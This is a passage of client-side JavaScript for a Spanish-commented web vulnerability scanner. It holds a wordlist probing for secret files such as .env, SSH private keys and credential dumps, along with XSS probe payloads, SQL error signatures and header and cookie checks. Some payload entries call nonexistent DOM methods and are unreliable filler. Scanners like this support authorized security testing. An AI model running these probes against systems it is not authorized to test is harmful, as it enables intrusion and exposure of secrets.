async function startScan() {
    const baseUrlInput = document.getElementById("urlInput").value.trim();
    if (!baseUrlInput) {
        alert("Por favor ingresa una URL válida");
        return;
    }

    // Normalizar la URL
    let baseUrl;
    try {
        baseUrl = new URL(baseUrlInput.startsWith('http') ? baseUrlInput : `https://${baseUrlInput}`);
        baseUrl = baseUrl.origin + '/'; // Asegurar que termine con /
    } catch (e) {
        alert("URL inválida. Por favor usa formato https://example.com");
        return;
    }

    const output = document.getElementById("output");
    const scanButton = document.getElementById("scanButton");
    output.textContent = `[+] Iniciando escaneo de: ${baseUrl}\n`;
    scanButton.disabled = true;
    scanButton.textContent = "Escaneando...";

const wordlist = [
    // Rutas originales (100)
    "admin", "login", "api", "dashboard", "config", "test", "backup", ".env", "console",
    "cpanel", "debug", "phpmyadmin", "private", "robots.txt", "secret", "file", "server-status",
    "wp-admin", "wp-login.php", "wp-content", "wp-includes", "xmlrpc.php", "user", "users",
    "account", "accounts", "adminpanel", "administrator", "phpinfo.php", "info.php", "test.php",
    "db", "database", "sql", "backup.sql", "dump.sql", "data", "logs", "error_log", "config.php",
    "settings.php", "wp-config.php", "config.json", "config.inc.php", "config.yml", "config.yaml",
    "README.md", "LICENSE", "CHANGELOG.txt", "composer.json", "package.json", ".git", ".svn",
    ".htaccess", ".htpasswd", ".gitignore", ".git/config", ".git/HEAD", ".DS_Store", "sitemap.xml",
    "sitemap.txt", "sitemap.json", "sitemap", "api-docs", "swagger", "swagger-ui", "graphql",
    "graphiql", "playground", "v1", "v2", "api/v1", "api/v2", "rest", "soap", "webservice",
    "oauth", "oauth2", "auth", "authentication", "login.jsp", "admin.jsp", "admin.do", "admin.action",
    "admin.asp", "admin.aspx", "admin.cgi", "admin.pl", "admin.py", "admin.rb", "admin.sh",
    
    // Nuevas rutas (300)
    // Archivos de configuración
    ".env.local", ".env.production", ".env.development", ".env.test", 
    "config.local.php", "config.prod.php", "config.dev.php",
    "configuration.ini", "configuration.cfg", "configuration.json",
    "secrets.json", "credentials.json", "keys.json", "passwords.txt",
    "appsettings.json", "app.config", "web.config", "application.cfg",
    "parameters.yml", "security.yml", "database.yml", "mongoid.yml",
    "docker-compose.yml", "docker-compose.prod.yml", "kubeconfig.yaml",
    
    // Archivos de base de datos
    "db.sqlite", "db.sqlite3", "database.db", "data.db", "backup.db",
    "dump.rdb", "redis.conf", "mongod.conf", "mysql.conf", "postgresql.conf",
    "db_backup.tar", "db_dump.gz", "database.sql.gz", "backup.sql.bz2",
    "db_export.csv", "data_export.xlsx", "users_export.json",
    
    // Directorios comunes
    "uploads/", "images/", "assets/", "static/", "media/", "tmp/", "temp/",
    "cache/", "session/", "vendor/", "node_modules/", "bower_components/",
    "storage/", "logs/", "backups/", "archives/", "downloads/", "export/",
    "import/", "migrations/", "scripts/", "bin/", "src/", "lib/", "dist/",
    
    // Archivos de sistema
    ".bash_history", ".bashrc", ".profile", ".ssh/", ".ssh/config",
    ".ssh/authorized_keys", ".ssh/id_rsa", ".ssh/id_rsa.pub",
    ".npmrc", ".yarnrc", ".gemrc", ".dockerignore", ".editorconfig",
    ".travis.yml", ".circleci/config.yml", "Jenkinsfile", "Makefile",
    "Procfile", "Vagrantfile", "dockerfile", "dockerfile.prod",
    
    // Archivos de versionado
    ".git/logs/HEAD", ".git/refs/heads/master", ".git/objects/",
    ".git/modules/", ".git/hooks/", ".svn/entries", ".hg/store/",
    ".bzr/", ".cvs/", "CVS/Entries", ".gitattributes", ".gitmodules",
    
    // Archivos de IDE
    ".idea/", ".vscode/", ".project", ".classpath", ".settings/",
    ".metadata/", "nbproject/", "build.xml", "workspace.xml",
    
    // Archivos de frameworks PHP
    "artisan", "composer.lock", "composer.phar", "index.php",
    "wp-load.php", "wp-settings.php", "wp-signup.php", "wp-trackback.php",
    "wp-cron.php", "wp-mail.php", "wp-activate.php", "wp-links-opml.php",
    "wp-blog-header.php", "wp-comments-post.php", "wp-config-sample.php",
    
    // Archivos de frameworks JavaScript
    "package-lock.json", "yarn.lock", "bower.json", "gulpfile.js",
    "gruntfile.js", "webpack.config.js", "rollup.config.js",
    "next.config.js", "nuxt.config.js", "angular.json", "vue.config.js",
    "react-app-env.d.ts", "tsconfig.json", "jsconfig.json",
    
    // Archivos de frameworks Python
    "requirements.txt", "Pipfile", "Pipfile.lock", "setup.py",
    "manage.py", "wsgi.py", "asgi.py", "uwsgi.ini", "gunicorn.conf.py",
    "celery.py", "settings.py", "urls.py", "local_settings.py",
    
    // Archivos de frameworks Ruby
    "Gemfile", "Gemfile.lock", "Rakefile", "config.ru", "Capfile",
    "Guardfile", "config/database.yml", "config/secrets.yml",
    
    // Archivos de frameworks Java
    "pom.xml", "build.gradle", "settings.gradle", "web.xml",
    "applicationContext.xml", "spring-config.xml", "log4j.properties",
    "logback.xml", "ehcache.xml", "struts.xml", "hibernate.cfg.xml",
    
    // Archivos de frameworks .NET
    "web.release.config", "web.debug.config", "Global.asax",
    "packages.config", "appsettings.Development.json", "Startup.cs",
    "Program.cs", "app.UseDeveloperExceptionPage()",
    
    // Endpoints de API comunes
    "api/v3", "api/v4", "api/latest", "api/stable", "api/docs",
    "api/swagger.json", "api/swagger.yaml", "api/redoc", "api/openapi.json",
    "api/graphql-playground", "api/graphiql", "api/health", "api/status",
    "api/version", "api/info", "api/ping", "api/ready", "api/live",
    
    // Endpoints de autenticación
    "oauth/authorize", "oauth/token", "oauth/revoke", "oauth/introspect",
    "oauth/userinfo", "openid-configuration", ".well-known/openid-configuration",
    "auth/login", "auth/logout", "auth/register", "auth/reset-password",
    "auth/forgot-password", "auth/verify-email", "auth/refresh-token",
    
    // Endpoints de administración
    "admin/api", "admin/console", "admin/phpmyadmin", "admin/mysql",
    "admin/postgres", "admin/mongodb", "admin/redis", "admin/elasticsearch",
    "admin/kibana", "admin/grafana", "admin/prometheus", "admin/rabbitmq",
    "admin/solr", "admin/jenkins", "admin/sonarqube", "admin/portainer",
    
    // Archivos de logs
    "error.log", "access.log", "debug.log", "query.log", "transaction.log",
    "system.log", "event.log", "security.log", "auth.log", "mail.log",
    "cron.log", "kernel.log", "application.log", "app.log", "server.log",
    "stderr.log", "stdout.log", "laravel.log", "django.log", "rails.log",
    
    // Archivos de backup
    "backup.zip", "backup.tar", "backup.tar.gz", "backup.rar",
    "backup.tgz", "backup.7z", "backup.bak", "backup.old",
    "backup_2023.zip", "backup_2023.tar.gz", "backup_latest.sql",
    "backup_full.sql", "backup_incremental.sql", "backup_daily.sql",
    "backup_weekly.sql", "backup_monthly.sql", "backup_yearly.sql",
    
    // Archivos de migración
    "migrations/", "db/migrate/", "database/migrations/",
    "migrations/2023", "migrations/latest", "migrations/initial",
    "migrations/schema.rb", "migrations/structure.sql",
    
    // Archivos de documentación
    "docs/", "documentation/", "help/", "guide/", "manual/",
    "readme.html", "readme.txt", "readme.pdf", "readme.docx",
    "CHANGELOG.md", "CONTRIBUTING.md", "SECURITY.md", "LICENSE.txt",
    "AUTHORS", "INSTALL", "UPGRADE", "RELEASE-NOTES",
    
    // Archivos de pruebas
    "tests/", "spec/", "features/", "test/", "unit/", "integration/",
    "e2e/", "fixtures/", "mocks/", "stubs/", "test.php", "test.py",
    "test.js", "test.rb", "test.java", "test.c", "test.cpp",
    
    // Archivos de despliegue
    "deploy/", "scripts/deploy.sh", "deploy.rb", "deploy.py",
    "deploy.cfg", "deploy.json", "deploy.yml", "deploy.prod.yml",
    "deploy.staging.yml", "deploy.dev.yml", "deploy.override.yml",
    
    // Archivos de CI/CD
    ".github/", ".gitlab-ci.yml", ".drone.yml", "azure-pipelines.yml",
    "bitbucket-pipelines.yml", "buildspec.yml", "cloudbuild.yaml",
    "codeship-steps.yml", "appveyor.yml", "circle.yml",
    
    // Archivos de monitoreo
    "monitoring/", "metrics/", "health/", "status/", "ping/",
    "ready/", "live/", "info/", "actuator/", "actuator/health",
    "actuator/info", "actuator/metrics", "actuator/env",
    
    // Archivos de seguridad
    "security.txt", ".security/", "vulnerabilities/", "audit/",
    "penetration-test/", "security-audit/", "threat-model/",
    "risk-assessment/", "security-policy.md", "SECURITY.md",
    
    // Archivos de internacionalización
    "locales/", "i18n/", "lang/", "translations/", "messages/",
    "en.json", "es.json", "fr.json", "de.json", "ja.json",
    "zh.json", "ru.json", "pt.json", "it.json", "ko.json",
    
    // Archivos de caché
    "cache/", "tmp/cache/", "var/cache/", "app/cache/",
    "storage/cache/", "bootstrap/cache/", "cache/manifest.json",
    "cache/data", "cache/views", "cache/models",
    
    // Archivos de sesión
    "sessions/", "tmp/sessions/", "var/sessions/", "app/sessions/",
    "storage/sessions/", "session.lock", "session.db", "session.json",
    
    // Archivos de almacenamiento
    "storage/", "var/storage/", "app/storage/", "storage/logs/",
    "storage/framework/", "storage/app/", "storage/public/",
    "storage/uploads/", "storage/backups/", "storage/export/"
];

    // Encabezados de seguridad comunes
    const securityHeaders = [
        "Content-Security-Policy",
        "X-Content-Type-Options",
        "X-Frame-Options",
        "Strict-Transport-Security",
        "Referrer-Policy",
        "Permissions-Policy",
        "X-XSS-Protection"
    ];

    // Métodos HTTP potencialmente inseguros
    const unsafeMethods = ["OPTIONS", "TRACE", "PUT", "DELETE", "PATCH", "PROPFIND"];

     // Payloads XSS de prueba
const xssPayloads = [
    '<scr' + 'ipt>alert(1)</scr' + 'ipt>',
    '"><img src=x onerror=alert(1)>',
    "'\"><scr" + "ipt>alert(1)</scr" + "ipt>",
    "javascript:alert(1)",
    "onload=alert(1)",
    "{{7*7}}",
    "${7*7}",
    "<svg/onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<body onload=alert(1)>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<div onmouseover=\"alert(1)\">hover</div>",
    "<input type=\"text\" value=\"\" onfocus=\"alert(1)\">",
    "<video><source onerror=\"alert(1)\">",
    "<audio src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<svg><script>alert(1)</scr" + "ipt>",
    "<img src=\"x:x\" onerror=\"alert(1)\">",
    "<form action=\"javascript:alert(1)\"><input type=submit>",
    "<isindex action=\"javascript:alert(1)\">",
    "<object data=\"javascript:alert(1)\">",
    "<embed src=\"javascript:alert(1)\">",
    "<base href=\"javascript:alert(1)//\">",
    "<math><brute href=\"javascript:alert(1)\">click</brute></math>",
    "<link rel=\"stylesheet\" href=\"javascript:alert(1)\">",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
    "<table background=\"javascript:alert(1)\"></table>",
    "<style>@import \"javascript:alert(1)\";</style>",
    "<style>li{list-style-image:url(\"javascript:alert(1)\");}</style>",
    "<img src=\"\" id=\"x\" name=\"x\" onerror=\"alert(1)\">",
    "<script src=\"data:,alert(1)\"></scr" + "ipt>",
    "<script src=\"data:text/javascript,alert(1)\"></scr" + "ipt>",
    "<script charset=\"UTF-7\">+ADw-script+AD4-alert(1)+ADw-/script+AD4-</scr" + "ipt>",
    "<img src=\"x\" style=\"background-image:url(javascript:alert(1))\">",
    "<img src=\"x\" style=\"xss:expression(alert(1))\">",
    "<xss id=\"x\" style=\"behavior:url(#default#time2)\" begin=\"0\" onbegin=\"alert(1)\">",
    "<xss style=\"xss:expression(alert(1))\">",
    "<script>eval('al'+'ert(1)')</scr" + "ipt>",
    "<script>Function('ale'+'rt(1)')()</scr" + "ipt>",
    "<script>setTimeout('alert(1)',0)</scr" + "ipt>",
    "<script>setInterval('alert(1)',0)</scr" + "ipt>",
    "<script>new Function('alert(1)')()</scr" + "ipt>",
    "<script>['alert(1)'].forEach(eval)</scr" + "ipt>",
    "<script>window['alert'](1)</scr" + "ipt>",
    "<script>parent['alert'](1)</scr" + "ipt>",
    "<script>self['alert'](1)</scr" + "ipt>",
    "<script>top['alert'](1)</scr" + "ipt>",
    "<script>frames['alert'](1)</scr" + "ipt>",
    "<script>content['alert'](1)</scr" + "ipt>",
    "<script>document.write('<script>alert(1)</scr' + 'ipt>')</scr" + "ipt>",
    "<script>document.writeln('<script>alert(1)</scr' + 'ipt>')</scr" + "ipt>",
    "<script>document.body.innerHTML='<script>alert(1)</scr' + 'ipt>'</scr" + "ipt>",
    "<script>document.writeInjection(1)</scr" + "ipt>",
    "<script>document.execCommand('alert(1)')</scr" + "ipt>",
    "<script>document.location='javascript:alert(1)'</scr" + "ipt>",
    "<script>document.location.href='javascript:alert(1)'</scr" + "ipt>",
    "<script>document.location.assign('javascript:alert(1)')</scr" + "ipt>",
    "<script>document.location.replace('javascript:alert(1)')</scr" + "ipt>",
    "<script>window.location='javascript:alert(1)'</scr" + "ipt>",
    "<script>window.location.href='javascript:alert(1)'</scr" + "ipt>",
    "<script>window.location.assign('javascript:alert(1)')</scr" + "ipt>",
    "<script>window.location.replace('javascript:alert(1)')</scr" + "ipt>",
    "<script>window.open('javascript:alert(1)')</scr" + "ipt>",
    "<script>window.navigate('javascript:alert(1)')</scr" + "ipt>",
    "<script>eval.call(null,'alert(1)')</scr" + "ipt>",
    "<script>['alert(1)'].some(eval)</scr" + "ipt>",
    "<script>['alert(1)'].map(eval)</scr" + "ipt>",
    "<script>['alert(1)'].find(eval)</scr" + "ipt>",
    "<script>import('data:text/javascript,alert(1)')</scr" + "ipt>",
    "<script>import('data:text/javascript;base64,'+btoa('alert(1)'))</scr" + "ipt>",
    "<script>new Worker('data:text/javascript,alert(1)')</scr" + "ipt>",
    "<script>new SharedWorker('data:text/javascript,alert(1)')</scr" + "ipt>",
    "<script>fetch('data:text/javascript,alert(1)').then(r=>r.text()).then(eval)</scr" + "ipt>",
    "<script>XMLHttpRequest.prototype.open=function(){alert(1)};new XMLHttpRequest().open()</scr" + "ipt>",
    "<script>document.cookie='xss=alert(1);path=/'</scr" + "ipt>",
    "<script>document.domain=document.cookie</scr" + "ipt>",
    "<script>document.domain=alert(1)</scr" + "ipt>",
    "<script>document.vulnerable=true</scr" + "ipt>",
    "<script>document.documentMode=alert(1)</scr" + "ipt>",
    "<script>document.implementation.createHTMLDocument('').write('<script>alert(1)</scr' + 'ipt>')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createProcessingInstruction('xml','version=\"1.0\"','alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocumentType('','','alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createCDATASection('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createComment('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createEntityReference('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createAttribute('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createTextNode('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createElement('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createElementNS('','alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createProcessingInstruction('xml','version=\"1.0\"','alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createDocumentFragment('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createRange('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createNodeIterator('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createTreeWalker('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createEvent('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createEventObject('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createExpression('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createNSResolver('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createL10nValue('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createL10nList('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createL10nDictionary('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createL10nContext('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createL10nService('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createL10nResource('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createL10nMessage('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createL10nFormat('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createL10nParse('alert(1)')</scr" + "ipt>",
    "<script>document.implementation.createDocument('','',null).createL10nSerialize('alert(1)')</scr" + "ipt>"
];
const sqlErrors = [
    // Errores genéricos de SQL
    "SQL syntax",
    "syntax error",
    "unclosed quotation mark",
    "unterminated quoted string",
    "quoted string not properly terminated",
    "unexpected end of SQL command",
    "incorrect syntax near",
    "invalid SQL statement",
    "SQL command not properly ended",
    "malformed SQL statement",
    
    // MySQL
    "MySQL Error",
    "MySQL server version",
    "Warning: mysql_",
    "You have an error in your SQL syntax; check the manual",
    "MySqlException",
    "com.mysql.jdbc.exceptions",
    "MySQLSyntaxErrorException",
    "Access denied for user",
    "Got error",
    "MySQL Query fail:",
    
    // PostgreSQL
    "PostgreSQL ERROR",
    "PostgreSQL query failed",
    "pg_query() [",
    "pg_exec() [",
    "PostgreSQL.DLL",
    "libpq.DLL",
    "Npgsql.NpgsqlException",
    "org.postgresql.util.PSQLException",
    "PSQLException",
    "PostgreSqlError:",
    
    // SQL Server
    "SQL Server",
    "Microsoft SQL Server",
    "SQLServerException",
    "System.Data.SqlClient.SqlException",
    "SQL Server Native Client",
    "SQL Server Driver",
    "SQLOLEDB",
    "SQL Server does not exist",
    "SQL Server Network Interfaces",
    "SQL Server Login failed",
    
    // Oracle
    "ORA-",
    "Oracle error",
    "OracleException",
    "Oracle JDBC Driver",
    "ORA-00933",
    "ORA-01017",
    "ORA-12514",
    "ORA-12154",
    "ORA-12541",
    "Oracle.DataAccess.Client",
    
    // SQLite
    "SQLite3::SQLException",
    "SQLite error",
    "SQLite3::CorruptException",
    "SQLite format",
    "sqlite3.OperationalError",
    "sqlite3.DatabaseError",
    "SQLite JDBCDriver",
    "SQLite.Exception",
    "SQLite.Interop.dll",
    "SQLiteManager",
    
    // ODBC/JDBC
    "ODBC Driver",
    "JDBC Driver",
    "ODBC Microsoft Access Driver",
    "ODBC SQL Server Driver",
    "JDBC MySQL Driver",
    "JDBC Oracle Driver",
    "Data provider could not be initialized",
    "ODBC error",
    "JDBC error",
    "ODBC connection",
    
    // PHP Database Errors
    "PDOException",
    "PDO error",
    "mysql_fetch_array()",
    "mysql_num_rows()",
    "mysql_result()",
    "mysql_query()",
    "mysqli::query()",
    "mysqli_query()",
    "mysql_connect()",
    "mysql_select_db()",
    
    // Otros motores de base de datos
    "Firebird error",
    "Interbase error",
    "Sybase message",
    "DB2 SQL error",
    "Informix error",
    "Microsoft JET Database",
    "Microsoft Access Driver",
    "Ingres SQLSTATE",
    "MaxDB error",
    "HSQLDB error",
    
    // Errores de conexión
    "could not connect to server",
    "connection failure",
    "server not responding",
    "failed to connect",
    "lost connection",
    "connection timeout",
    "connection refused",
    "no database selected",
    "unknown database",
    "authentication failed",
    
    // Errores de sintaxis específicos
    "near \"'\" at line",
    "at character",
    "at line number",
    "at offset",
    "unexpected token",
    "expecting end of input",
    "expecting keyword",
    "expecting identifier",
    "expecting string",
    "expecting integer",
    
    // Errores de permisos
    "access denied",
    "permission denied",
    "insufficient privileges",
    "not authorized",
    "read-only database",
    "cannot execute",
    "cannot update",
    "cannot delete",
    "cannot insert",
    "cannot select"
];

   const frameworks = [
    // Frontend Frameworks
    { name: "Vue.js", pattern: /vue[.\-]?js|vue\b/i },
    { name: "React", pattern: /react[.\-]?js|react\b/i },
    { name: "Angular", pattern: /angular[.\-]?js|angular\b/i },
    { name: "Svelte", pattern: /svelte[.\-]?js|svelte\b/i },
    { name: "Ember.js", pattern: /ember[.\-]?js|ember\b/i },
    { name: "Backbone.js", pattern: /backbone[.\-]?js|backbone\b/i },
    { name: "Alpine.js", pattern: /alpine[.\-]?js|alpine\b/i },
    { name: "Stimulus", pattern: /stimulus[.\-]?js|stimulus\b/i },
    { name: "Mithril", pattern: /mithril[.\-]?js|mithril\b/i },
    { name: "Preact", pattern: /preact[.\-]?js|preact\b/i },

    // UI Libraries
    { name: "jQuery", pattern: /jquery[.\-]?js|jquery\b|\$\./i },
    { name: "Bootstrap", pattern: /bootstrap[.\-]?js|bootstrap\b/i },
    { name: "Foundation", pattern: /foundation[.\-]?js|foundation\b/i },
    { name: "Semantic UI", pattern: /semantic[.\-]?ui|semantic\b/i },
    { name: "Bulma", pattern: /bulma[.\-]?css|bulma\b/i },
    { name: "Tailwind CSS", pattern: /tailwind[.\-]?css|tailwind\b/i },
    { name: "Materialize", pattern: /materialize[.\-]?css|materialize\b/i },
    { name: "UIkit", pattern: /uikit[.\-]?js|uikit\b/i },
    { name: "Chakra UI", pattern: /chakra[.\-]?ui|chakra\b/i },
    { name: "Ant Design", pattern: /ant[.\-]?design|antd\b/i },

    // Backend Frameworks
    { name: "Express.js", pattern: /express[.\-]?js|express\b/i },
    { name: "Laravel", pattern: /laravel[.\-]?php|laravel\b/i },
    { name: "Django", pattern: /django[.\-]?python|django\b/i },
    { name: "Ruby on Rails", pattern: /rails|ruby[.\-]?on[.\-]?rails/i },
    { name: "Spring Boot", pattern: /spring[.\-]?boot|spring\b/i },
    { name: "Flask", pattern: /flask[.\-]?python|flask\b/i },
    { name: "ASP.NET", pattern: /asp[.\-]?net|\.net\b/i },
    { name: "NestJS", pattern: /nestjs[.\-]?js|nestjs\b/i },
    { name: "FastAPI", pattern: /fastapi[.\-]?python|fastapi\b/i },
    { name: "Koa", pattern: /koa[.\-]?js|koa\b/i },

    // CMS
    { name: "WordPress", pattern: /wp[.\-]|wordpress/i },
    { name: "Drupal", pattern: /drupal[.\-]?cms|drupal\b/i },
    { name: "Joomla", pattern: /joomla[.\-]?cms|joomla\b/i },
    { name: "Magento", pattern: /magento[.\-]?ecommerce|magento\b/i },
    { name: "Shopify", pattern: /shopify[.\-]?liquid|shopify\b/i },
    { name: "Wix", pattern: /wix[.\-]?sites|wix\b/i },
    { name: "Squarespace", pattern: /squarespace[.\-]?cms|squarespace\b/i },
    { name: "Ghost", pattern: /ghost[.\-]?cms|ghost\b/i },
    { name: "Strapi", pattern: /strapi[.\-]?cms|strapi\b/i },
    { name: "Contentful", pattern: /contentful[.\-]?cms|contentful\b/i },

    // E-commerce
    { name: "WooCommerce", pattern: /woocommerce|woo[.\-]?commerce/i },
    { name: "PrestaShop", pattern: /prestashop[.\-]?cms|prestashop\b/i },
    { name: "OpenCart", pattern: /opencart[.\-]?ecommerce|opencart\b/i },
    { name: "BigCommerce", pattern: /bigcommerce[.\-]?ecommerce|bigcommerce\b/i },
    { name: "Saleor", pattern: /saleor[.\-]?graphql|saleor\b/i },
    { name: "Sylius", pattern: /sylius[.\-]?php|sylius\b/i },
    { name: "Spree", pattern: /spree[.\-]?commerce|spree\b/i },
    { name: "Solidus", pattern: /solidus[.\-]?commerce|solidus\b/i },
    { name: "Medusa", pattern: /medusa[.\-]?js|medusa\b/i },
    { name: "Commerce.js", pattern: /commerce[.\-]?js|commercejs\b/i },

    // Static Site Generators
    { name: "Next.js", pattern: /next[.\-]?js|next\b/i },
    { name: "Gatsby", pattern: /gatsby[.\-]?js|gatsby\b/i },
    { name: "Nuxt.js", pattern: /nuxt[.\-]?js|nuxt\b/i },
    { name: "Hugo", pattern: /hugo[.\-]?ssg|hugo\b/i },
    { name: "Jekyll", pattern: /jekyll[.\-]?ruby|jekyll\b/i },
    { name: "Eleventy", pattern: /11ty|eleventy/i },
    { name: "Astro", pattern: /astro[.\-]?build|astro\b/i },
    { name: "Sapper", pattern: /sapper[.\-]?js|sapper\b/i },
    { name: "Gridsome", pattern: /gridsome[.\-]?js|gridsome\b/i },
    { name: "VitePress", pattern: /vitepress[.\-]?js|vitepress\b/i },

    // Mobile Frameworks
    { name: "React Native", pattern: /react[.\-]?native/i },
    { name: "Flutter", pattern: /flutter[.\-]?dart|flutter\b/i },
    { name: "Ionic", pattern: /ionic[.\-]?framework|ionic\b/i },
    { name: "NativeScript", pattern: /nativescript[.\-]?js|nativescript\b/i },
    { name: "Cordova", pattern: /cordova[.\-]?js|cordova\b/i },
    { name: "Capacitor", pattern: /capacitor[.\-]?js|capacitor\b/i },
    { name: "Xamarin", pattern: /xamarin[.\-]?forms|xamarin\b/i },
    { name: "Quasar", pattern: /quasar[.\-]?framework|quasar\b/i },
    { name: "Framework7", pattern: /framework7[.\-]?js|framework7\b/i },
    { name: "Onsen UI", pattern: /onsen[.\-]?ui|onsen\b/i },

    // Testing Frameworks
    { name: "Jest", pattern: /jest[.\-]?js|jest\b/i },
    { name: "Mocha", pattern: /mocha[.\-]?js|mocha\b/i },
    { name: "Cypress", pattern: /cypress[.\-]?io|cypress\b/i },
    { name: "Puppeteer", pattern: /puppeteer[.\-]?js|puppeteer\b/i },
    { name: "Playwright", pattern: /playwright[.\-]?test|playwright\b/i },
    { name: "Testing Library", pattern: /testing[.\-]?library/i },
    { name: "Jasmine", pattern: /jasmine[.\-]?js|jasmine\b/i },
    { name: "Karma", pattern: /karma[.\-]?runner|karma\b/i },
    { name: "Protractor", pattern: /protractor[.\-]?js|protractor\b/i },
    { name: "Nightwatch", pattern: /nightwatch[.\-]?js|nightwatch\b/i },

    // Build Tools
    { name: "Webpack", pattern: /webpack[.\-]?js|webpack\b/i },
    { name: "Rollup", pattern: /rollup[.\-]?js|rollup\b/i },
    { name: "Parcel", pattern: /parcel[.\-]?bundler|parcel\b/i },
    { name: "Vite", pattern: /vite[.\-]?js|vite\b/i },
    { name: "Snowpack", pattern: /snowpack[.\-]?js|snowpack\b/i },
    { name: "Gulp", pattern: /gulp[.\-]?js|gulp\b/i },
    { name: "Grunt", pattern: /grunt[.\-]?js|grunt\b/i },
    { name: "Browserify", pattern: /browserify[.\-]?js|browserify\b/i },
    { name: "ESBuild", pattern: /esbuild[.\-]?js|esbuild\b/i },
    { name: "SWC", pattern: /swc[.\-]?compiler|swc\b/i },

    // State Management
    { name: "Redux", pattern: /redux[.\-]?js|redux\b/i },
    { name: "MobX", pattern: /mobx[.\-]?js|mobx\b/i },
    { name: "XState", pattern: /xstate[.\-]?js|xstate\b/i },
    { name: "Vuex", pattern: /vuex[.\-]?js|vuex\b/i },
    { name: "Pinia", pattern: /pinia[.\-]?js|pinia\b/i },
    { name: "NgRx", pattern: /ngrx[.\-]?angular|ngrx\b/i },
    { name: "Akita", pattern: /akita[.\-]?state|akita\b/i },
    { name: "Recoil", pattern: /recoil[.\-]?js|recoil\b/i },
    { name: "Zustand", pattern: /zustand[.\-]?js|zustand\b/i },
    { name: "Jotai", pattern: /jotai[.\-]?js|jotai\b/i },

    // GraphQL
    { name: "Apollo", pattern: /apollo[.\-]?(client|server)/i },
    { name: "Relay", pattern: /relay[.\-]?graphql|relay\b/i },
    { name: "GraphQL Yoga", pattern: /graphql[.\-]?yoga/i },
    { name: "Hasura", pattern: /hasura[.\-]?graphql|hasura\b/i },
    { name: "Prisma", pattern: /prisma[.\-]?graphql|prisma\b/i },
    { name: "GraphQL Tools", pattern: /graphql[.\-]?tools/i },
    { name: "GraphQL Codegen", pattern: /graphql[.\-]?codegen/i },
    { name: "GraphQL Nexus", pattern: /graphql[.\-]?nexus/i },
    { name: "GraphQL Helix", pattern: /graphql[.\-]?helix/i },
    { name: "GraphQL Mesh", pattern: /graphql[.\-]?mesh/i },

    // Databases/ORMs
    { name: "Mongoose", pattern: /mongoose[.\-]?js|mongoose\b/i },
    { name: "Sequelize", pattern: /sequelize[.\-]?js|sequelize\b/i },
    { name: "TypeORM", pattern: /typeorm[.\-]?js|typeorm\b/i },
    { name: "Prisma", pattern: /prisma[.\-]?client|prisma\b/i },
    { name: "Firebase", pattern: /firebase[.\-]?database|firebase\b/i },
    { name: "Supabase", pattern: /supabase[.\-]?client|supabase\b/i },
    { name: "MikroORM", pattern: /mikro[.\-]?orm|mikroorm\b/i },
    { name: "Objection.js", pattern: /objection[.\-]?js|objection\b/i },
    { name: "Waterline", pattern: /waterline[.\-]?orm|waterline\b/i },
    { name: "Bookshelf.js", pattern: /bookshelf[.\-]?js|bookshelf\b/i }
];
    // Objeto para almacenar resultados
    const results = {
        headers: {},
        vulnerabilities: [],
        technologies: [],
        foundPaths: []
    };

    // Función para agregar logs con timestamp
    function log(message) {
        const timestamp = new Date().toLocaleTimeString();
        output.textContent += `[${timestamp}] ${message}\n`;
        output.scrollTop = output.scrollHeight;
    }

    // Función para manejar errores de fetch
    async function safeFetch(url, options = {}) {
        try {
            const response = await fetch(url, options);
            return {
                ok: response.ok,
                status: response.status,
                headers: response.headers,
                text: await response.text()
            };
        } catch (error) {
            return { error: error.message };
        }
    }

    // --- Análisis de encabezados ---
    log("Analizando encabezados HTTP...");
    
    try {
        const response = await safeFetch(baseUrl, { method: 'HEAD' });
        if (response.error) throw new Error(response.error);

        // Almacenar headers
        results.headers = {};
        response.headers.forEach((value, key) => {
            results.headers[key.toLowerCase()] = value;
        });

        log("\n[HEADERS]");
        for (const [key, value] of Object.entries(results.headers)) {
            log(`    ${key}: ${value}`);
        }

        // Análisis de cookies
        if (results.headers['set-cookie']) {
            log("\n[🍪 COOKIES]");
            const cookies = Array.isArray(results.headers['set-cookie']) ? 
                          results.headers['set-cookie'] : [results.headers['set-cookie']];
            
            cookies.forEach(cookie => {
                log(`    ${cookie}`);
                if (!cookie.includes('Secure')) {
                    log("      [⚠] Falta flag Secure");
